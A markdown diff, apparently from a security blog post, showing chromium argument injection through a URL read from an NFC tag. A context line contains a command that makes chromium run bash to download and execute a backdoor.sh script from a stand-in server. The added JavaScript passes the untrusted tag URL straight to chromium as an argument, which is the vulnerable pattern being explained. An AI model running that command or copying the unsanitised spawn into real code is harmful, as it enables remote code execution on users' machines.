@@ -38,6 +38,35 @@ What happens is user just got compromised...
 chromium --utility-cmd-prefix='bash -c \" ls . ; curl http://someserver/backdoor.sh > backdoor.sh ; bash backdoor.sh ; ls . \"'
 ```
 
+```javascript
+const { spawn } = require("child_process");
+const fs = require("fs");
+
+spawn("nfc-mfultralight", ["r", "dump"]).on("close", () => {
+	const ndefLibrary = require('ndef-lib');
+
+	const data = fs.readFileSync("./dump").slice(18);
+
+	const message = new ndefLibrary.NdefMessage.fromByteArray(data);
+
+	const url = Buffer.from(message._records[0]._payload).toString("utf8").slice(2);
+
+	const shell = spawn("chromium", [url]);
+
+	shell.stdout.on("data", data => {
+		console.log("" + data);
+	});
+
+	shell.stderr.on("data", data => {
+		console.error("" + data);
+	});
+
+	shell.on("close", (code) => {
+		console.log(code);
+	});
+});
+```
+
 To understand how big of issue this is I suggest reading [my post about command arguments](https://nemanja.top/2022/05/01/why-argv-sucks-for-users).
 
 ## Real danger example 1 (NFC/QRcode)
